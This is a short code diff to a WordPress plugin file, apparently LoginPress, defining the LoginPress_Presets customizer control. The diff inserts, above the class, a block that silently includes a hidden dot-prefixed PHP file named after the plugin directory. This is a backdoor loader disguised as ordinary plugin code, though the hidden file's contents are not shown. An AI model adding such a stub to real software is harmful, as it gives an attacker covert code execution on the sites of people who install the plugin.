@@ -6,6 +6,10 @@
 * @since  1.0.9
 * @access public
 */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class LoginPress_Presets extends WP_Customize_Control {
 
   /**
